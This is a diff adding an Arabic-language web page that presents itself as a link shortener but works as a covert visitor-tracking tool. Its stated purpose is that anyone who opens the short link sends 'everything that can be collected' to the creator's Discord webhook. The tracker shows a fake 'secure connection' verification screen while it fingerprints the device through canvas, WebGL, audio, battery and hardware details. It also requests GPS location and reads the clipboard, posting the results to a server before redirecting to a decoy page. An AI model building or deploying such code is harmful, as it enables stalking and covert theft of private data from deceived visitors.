@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
+<meta name="theme-color" content="#0a0a12" />
+<title>رابط قصير</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #08080e;
+    --accent1: #f43f5e;
+    --accent2: #a855f7;
+    --accent3: #3b82f6;
+    --text: #f8fafc;
+    --muted: #94a3b8;
+    --glass: rgba(255,255,255,0.04);
+    --line: rgba(255,255,255,0.08);
+  }
+  html, body {
+    min-height: 100%;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "SF Pro", system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
+  body::before, body::after {
+    content: '';
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(90px);
+    opacity: .35;
+    pointer-events: none;
+    z-index: 0;
+  }
+  body::before {
+    width: 420px; height: 420px;
+    background: var(--accent2);
+    top: -120px; left: -120px;
+    animation: drift 22s ease-in-out infinite;
+  }
+  body::after {
+    width: 520px; height: 520px;
+    background: var(--accent1);
+    bottom: -160px; right: -160px;
+    animation: drift 28s ease-in-out infinite reverse;
+  }
+  @keyframes drift {
+    0%,100% { transform: translate(0,0) scale(1); }
+    50%     { transform: translate(60px,-40px) scale(1.1); }
+  }
+  .wrap {
+    min-height: 100vh;
+    display: grid;
+    place-items: center;
+    padding: 24px;
+    position: relative;
+    z-index: 1;
+  }
+  .card {
+    background: var(--glass);
+    backdrop-filter: blur(24px);
+    -webkit-backdrop-filter: blur(24px);
+    border: 1px solid var(--line);
+    border-radius: 24px;
+    padding: 40px 32px;
+    width: 100%;
+    max-width: 520px;
+    box-shadow: 0 30px 60px -20px rgba(0,0,0,0.7);
+    position: relative;
+    overflow: hidden;
+  }
+  .card::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    border-radius: 24px;
+    padding: 1px;
+    background: linear-gradient(135deg,
+      rgba(244,63,94,.35), rgba(168,85,247,.35), rgba(59,130,246,.35));
+    -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+    -webkit-mask-composite: xor;
+    mask-composite: exclude;
+    pointer-events: none;
+  }
+  .logo {
+    width: 56px; height: 56px;
+    border-radius: 16px;
+    background: linear-gradient(135deg, var(--accent1), var(--accent2));
+    display: grid;
+    place-items: center;
+    font-size: 28px;
+    margin-bottom: 22px;
+    box-shadow: 0 12px 32px -12px var(--accent1);
+  }
+  h1 {
+    font-size: 26px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+    margin-bottom: 8px;
+    background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+    -webkit-background-clip: text;
+    background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
+  .sub {
+    color: var(--muted);
+    font-size: 14px;
+    line-height: 1.6;
+    margin-bottom: 26px;
+  }
+  label {
+    display: block;
+    font-size: 12.5px;
+    font-weight: 500;
+    color: var(--muted);
+    margin: 14px 2px 8px;
+  }
+  input {
+    width: 100%;
+    padding: 14px 16px;
+    background: rgba(0,0,0,.35);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    color: var(--text);
+    font-size: 14px;
+    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    direction: ltr;
+    text-align: left;
+    transition: all .2s;
+  }
+  input:focus {
+    outline: none;
+    border-color: rgba(244,63,94,.5);
+    background: rgba(0,0,0,.5);
+    box-shadow: 0 0 0 3px rgba(244,63,94,.12);
+  }
+  input::placeholder { color: #475569; }
+  .btn {
+    width: 100%;
+    padding: 15px;
+    margin-top: 20px;
+    background: linear-gradient(135deg, var(--accent1), var(--accent2));
+    border: none;
+    border-radius: 12px;
+    color: #fff;
+    font-size: 15px;
+    font-weight: 700;
+    font-family: inherit;
+    cursor: pointer;
+    transition: transform .15s, box-shadow .2s;
+    position: relative;
+  }
+  .btn:hover:not(:disabled) {
+    transform: translateY(-1px);
+    box-shadow: 0 12px 28px -8px var(--accent1);
+  }
+  .btn:active:not(:disabled) { transform: translateY(0); }
+  .btn:disabled { opacity: .6; cursor: not-allowed; }
+  .spinner {
+    width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,.25);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
+    display: inline-block;
+    vertical-align: -3px;
+    margin-left: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .err {
+    color: #fda4af;
+    font-size: 13px;
+    margin-top: 14px;
+    padding: 10px 14px;
+    background: rgba(244,63,94,.1);
+    border: 1px solid rgba(244,63,94,.25);
+    border-radius: 10px;
+    display: none;
+  }
+  .err.show { display: block; }
+  .result {
+    margin-top: 24px;
+    padding: 20px;
+    background: rgba(0,0,0,.35);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    display: none;
+  }
+  .result.show { display: block; animation: fadeIn .3s ease; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(6px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .rl {
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+  }
+  .link-row {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+    background: rgba(0,0,0,.5);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    padding: 12px 14px;
+    margin-bottom: 16px;
+  }
+  .link-text {
+    flex: 1;
+    font-family: ui-monospace, "SF Mono", Menlo, monospace;
+    font-size: 13.5px;
+    color: #fca5a5;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+    direction: ltr;
+    text-align: left;
+  }
+  .copy {
+    padding: 7px 14px;
+    background: rgba(244,63,94,.15);
+    border: 1px solid rgba(244,63,94,.35);
+    color: #fda4af;
+    border-radius: 8px;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all .2s;
+    font-family: inherit;
+    white-space: nowrap;
+  }
+  .copy:hover { background: rgba(244,63,94,.28); }
+  .copy.ok {
+    background: rgba(34,197,94,.15);
+    border-color: rgba(34,197,94,.4);
+    color: #86efac;
+  }
+  .qr {
+    display: flex;
+    justify-content: center;
+    padding: 14px;
+    background: #fff;
+    border-radius: 14px;
+    width: fit-content;
+    margin: 0 auto;
+  }
+  .qr img { display: block; border-radius: 4px; }
+
+  /* tracker */
+  .track {
+    text-align: center;
+    padding: 48px 20px;
+  }
+  .tspin {
+    width: 60px; height: 60px;
+    margin: 0 auto 26px;
+    border-radius: 50%;
+    border: 3px solid rgba(255,255,255,.08);
+    border-top-color: var(--accent1);
+    border-right-color: var(--accent2);
+    animation: spin 1s linear infinite;
+  }
+  .track h2 {
+    font-size: 18px;
+    font-weight: 600;
+    margin-bottom: 8px;
+  }
+  .track p {
+    color: var(--muted);
+    font-size: 14px;
+    margin-bottom: 26px;
+  }
+  .track .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 12px;
+    background: rgba(34,197,94,.1);
+    border: 1px solid rgba(34,197,94,.3);
+    color: #86efac;
+    border-radius: 999px;
+    font-size: 12px;
+    margin-bottom: 18px;
+  }
+  .track button {
+    padding: 11px 26px;
+    background: rgba(255,255,255,.06);
+    border: 1px solid var(--line);
+    color: var(--text);
+    border-radius: 10px;
+    font-size: 14px;
+    font-family: inherit;
+    cursor: pointer;
+    transition: background .2s;
+  }
+  .track button:hover { background: rgba(255,255,255,.12); }
+</style>
+</head>
+<body>
+<div class="wrap" id="app"></div>
+
+<script>
+(() => {
+  const path = (location.pathname || '/').replace(/^\/+|\/+$/g, '');
+  const isTrack = /^[a-z0-9]{6,8}$/.test(path);
+
+  const app = document.getElementById('app');
+
+  if (isTrack) {
+    renderTracker(path);
+  } else {
+    renderGenerator();
+  }
+
+  // ---------- GENERATOR ----------
+  function renderGenerator() {
+    app.innerHTML = `
+      <div class="card">
+        <div class="logo">🔗</div>
+        <h1>رابط قصير، معلومات كاملة</h1>
+        <p class="sub">ضع رابط الويب هوك، اضغط الزر، واحصل على رابط قصير. أي شخص يفتحه — كل ما يمكن جمعه عنه يوصل لك.</p>
+
+        <label for="wh">رابط الويب هوك (Discord أو أي HTTPS)</label>
+        <input id="wh" type="url" placeholder="https://discord.com/api/webhooks/…" />
+
+        <label for="dc">رابط التحويل بعد التسجيل (اختياري)</label>
+        <input id="dc" type="url" placeholder="https://www.google.com" />
+
+        <button class="btn" id="go">توليد الرابط القصير</button>
+        <div class="err" id="err"></div>
+
+        <div class="result" id="res">
+          <div class="rl">الرابط القصير</div>
+          <div class="link-row">
+            <span class="link-text" id="short"></span>
+            <button class="copy" id="copy">نسخ</button>
+          </div>
+          <div class="qr"><img id="qr" width="200" height="200" alt="QR" /></div>
+        </div>
+      </div>
+    `;
+
+    const $ = (id) => document.getElementById(id);
+    const err = $('err'), res = $('res'), btn = $('go');
+    const shortEl = $('short'), copyBtn = $('copy'), qr = $('qr');
+
+    btn.addEventListener('click', async () => {
+      err.classList.remove('show');
+      const webhook = $('wh').value.trim();
+      const decoy = $('dc').value.trim();
+
+      if (!webhook || !/^https?:\/\//i.test(webhook)) {
+        err.textContent = 'رابط الويب هوك غير صالح (يبدأ بـ https://)';
+        err.classList.add('show');
+        return;
+      }
+
+      btn.disabled = true;
+      btn.innerHTML = 'جارٍ التوليد… <span class="spinner"></span>';
+
+      try {
+        const r = await fetch('/api/shorten', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ webhook, decoy: decoy || null }),
+        }).then((x) => x.json());
+
+        if (!r.short) throw new Error(r.error || 'فشل التوليد');
+
+        shortEl.textContent = r.short;
+        qr.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(r.short);
+        res.classList.add('show');
+        btn.disabled = false;
+        btn.innerHTML = 'توليد رابط آخر';
+
+        copyBtn.onclick = async () => {
+          try {
+            await navigator.clipboard.writeText(r.short);
+            copyBtn.textContent = '✓ تم';
+            copyBtn.classList.add('ok');
+            setTimeout(() => {
+              copyBtn.textContent = 'نسخ';
+              copyBtn.classList.remove('ok');
+            }, 2000);
+          } catch {}
+        };
+      } catch (e) {
+        err.textContent = e.message || 'خطأ غير متوقع';
+        err.classList.add('show');
+        btn.disabled = false;
+        btn.innerHTML = 'توليد الرابط القصير';
+      }
+    });
+  }
+
+  // ---------- TRACKER ----------
+  async function renderTracker(code) {
+    app.innerHTML = `
+      <div class="card track">
+        <div class="tspin"></div>
+        <h2>جارٍ التحقق من الرابط…</h2>
+        <p>سيتم تحويلك خلال لحظات</p>
+        <div class="badge">🛡️ اتصال آمن</div>
+        <br/>
+        <button id="cont">متابعة الآن</button>
+      </div>
+    `;
+
+    const fp = await collectFingerprint();
+
+    let redirect = 'https://www.google.com';
+    try {
+      const r = await fetch('/api/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code, phase: 'initial', fingerprint: fp }),
+      }).then((x) => x.json());
+      if (r.redirect) redirect = r.redirect;
+    } catch {}
+
+    const timer = setTimeout(() => location.replace(redirect), 5000);
+
+    document.getElementById('cont').addEventListener('click', async () => {
+      clearTimeout(timer);
+      const [clipboard, gps] = await Promise.all([readClipboard(), readGPS()]);
+      fetch('/api/track', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code, phase: 'supplement', clipboard, gps }),
+        keepalive: true,
+      }).catch(() => {});
+      location.replace(redirect);
+    });
+  }
+
+  // ---------- FINGERPRINT ----------
+  async function collectFingerprint() {
+    const safe = (fn) => {
+      try { return fn(); } catch { return null; }
+    };
+    const safeAsync = async (fn) => {
+      try { return await fn(); } catch { return null; }
+    };
+
+    const canvasFP = () => {
+      const c = document.createElement('canvas');
+      c.width = 300; c.height = 70;
+      const x = c.getContext('2d');
+      if (!x) return null;
+      x.textBaseline = 'top';
+      x.font = '16px "Arial"';
+      x.fillStyle = '#f60';
+      x.fillRect(100, 10, 80, 30);
+      x.fillStyle = '#069';
+      x.fillText('fp::x::#9', 12, 12);
+      x.fillStyle = 'rgba(102,204,0,.7)';
+      x.fillText('fp::x::#9', 14, 28);
+      return c.toDataURL().slice(-96);
+    };
+
+    const webglFP = () => {
+      const c = document.createElement('canvas');
+      const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+      if (!gl) return null;
+      const d = gl.getExtension('WEBGL_debug_renderer_info');
+      if (!d) return null;
+      return (
+        gl.getParameter(d.UNMASKED_VENDOR_WEBGL) + ' / ' +
+        gl.getParameter(d.UNMASKED_RENDERER_WEBGL)
+      );
+    };
+
+    const audioFP = async () => {
+      const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+      if (!AC) return null;
+      const ctx = new AC(1, 44100, 44100);
+      const osc = ctx.createOscillator();
+      osc.type = 'triangle';
+      osc.frequency.value = 10000;
+      const comp = ctx.createDynamicsCompressor();
+      osc.connect(comp); comp.connect(ctx.destination);
+      osc.start(0);
+      const buf = await ctx.startRendering();
+      const data = buf.getChannelData(0);
+      let s = 0;
+      for (let i = 0; i < data.length; i += 100) s += Math.abs(data[i]);
+      return s.toFixed(6);
+    };
+
+    const battery = async () => {
+      if (!navigator.getBattery) return null;
+      const b = await navigator.getBattery();
+      return 'charging=' + b.charging + ' level=' + (b.level * 100).toFixed(0) + '%';
+    };
+
+    const deviceModel = async () => {
+      if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) return null;
+      try {
+        const d = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'architecture']);
+        return [d.platformVersion, d.model, d.architecture].filter(Boolean).join(' ');
+      } catch { return null; }
+    };
+
+    const mediaDevices = async () => {
+      if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
+      try {
+        const list = await navigator.mediaDevices.enumerateDevices();
+        const counts = {};
+        list.forEach((d) => { counts[d.kind] = (counts[d.kind] || 0) + 1; });
+        return JSON.stringify(counts);
+      } catch { return null; }
+    };
+
+    const gps = await readGPS();
+
+    return {
+      screen: safe(() => screen.width + '×' + screen.height + ' @ ' + window.devicePixelRatio + 'x'),
+      viewport: safe(() => innerWidth + '×' + innerHeight),
+      dpr: safe(() => window.devicePixelRatio),
+      timezone: safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
+      language: safe(() => navigator.language),
+      languages: safe(() => (navigator.languages || []).join(', ')),
+      platform: safe(() => (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform),
+      cores: safe(() => navigator.hardwareConcurrency),
+      memory: safe(() => navigator.deviceMemory),
+      touch: safe(() => 'maxTouchPoints=' + navigator.maxTouchPoints),
+      mobile: safe(() => (navigator.userAgentData ? navigator.userAgentData.mobile : /Mobi|Android/i.test(navigator.userAgent))),
+      deviceModel: await safeAsync(deviceModel),
+      connection: safe(() => {
+        const c = navigator.connection;
+        if (!c) return null;
+        return c.effectiveType + ' / ' + c.downlink + 'Mbps / ' + c.rtt + 'ms';
+      }),
+      battery: await safeAsync(battery),
+      mediaDevices: await safeAsync(mediaDevices),
+      cookies: safe(() => navigator.cookieEnabled),
+      canvas: safe(canvasFP),
+      webgl: safe(webglFP),
+      audio: await safeAsync(audioFP),
+      plugins: safe(() => Array.from(navigator.plugins || []).map((p) => p.name).join(', ')),
+      url: safe(() => location.href),
+      referrer: safe(() => document.referrer || '(direct)'),
+      gps,
+    };
+  }
+
+  function readGPS() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) return resolve(null);
+      const to = setTimeout(() => resolve(null), 3500);
+      navigator.geolocation.getCurrentPosition(
+        (p) => {
+          clearTimeout(to);
+          resolve(
+            p.coords.latitude + ',' + p.coords.longitude +
+            ' ±' + Math.round(p.coords.accuracy) + 'm'
+          );
+        },
+        () => { clearTimeout(to); resolve(null); },
+        { timeout: 3500, maximumAge: 0 }
+      );
+    });
+  }
+
+  async function readClipboard() {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (!text) return '(empty)';
+      return '[' + text.length + ' chars] ' + text.slice(0, 400);
+    } catch { return null; }
+  }
+})();
+</script>
+</body>
+</html>
